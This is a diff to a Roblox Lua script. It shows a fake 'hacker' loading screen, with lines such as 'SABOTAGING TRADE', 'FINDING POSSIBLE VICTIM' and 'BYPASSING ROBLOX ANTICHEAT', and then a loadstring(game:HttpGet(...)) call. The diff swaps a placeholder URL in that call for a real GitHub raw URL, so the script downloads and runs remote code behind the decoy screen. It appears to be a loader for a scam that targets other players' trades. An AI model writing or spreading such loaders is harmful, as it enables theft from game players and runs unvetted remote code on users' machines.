@@ -68,15 +68,15 @@ local lines = {
 	"<font color='#00AAFF'>BYPASSING SERVER PLEASE WAIT...</font>",
 	"-----------------------------",
 	"[+] INITIALIZING VIRTUAL MACHINE...",
-	"[+] FREEZE TRADE <font color='#00FF00'>v1.2</font>",
+	"[+] SABOTAGING TRADE <font color='#00FF00'>v1.2</font>",
 	"[+] SCRAPING DATA PACKETS...",
 	"[+] DESYNC BYPASS <font color='#00FF00'>ACTIVE</font>",
 	"[+] SEARCHING FOR VULNERABILITIES...",
-	"[+] INSTANT STEAL <font color='#00FF00'>LOADED</font>",
+	"[+] FINDING POSSIBLE VICTIM<font color='#00FF00'>LOADED</font>",
 	"[+] BYPASSING ROBLOX ANTICHEAT...",
-	"[+] ADMIN PANEL <font color='#00FF00'>ENABLED</font>",
+	"[+] TRADE PANEL <font color='#00FF00'>ENABLED</font>",
 	"[+] ENCRYPTING DATA STREAMS...",
-	"[+] DUPE ENGINE <font color='#00FF00'>5.0</font>",
+	"[+] TRADE ENGINE <font color='#00FF00'>5.0</font>",
 	"-----------------------------",
 	"<font color='#FFFF00'>FINALIZING HANDSHAKE...</font>"
 }
@@ -121,7 +121,7 @@ task.wait(8)
 
 -- Now that the loading bar is 100%, execute the real script
 local success, err = pcall(function()
-    loadstring(game:HttpGet("https://your-script-url-here.com/script.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/script-9209/Test/refs/heads/main/Tradad"))()
 end)
 
 if not success then
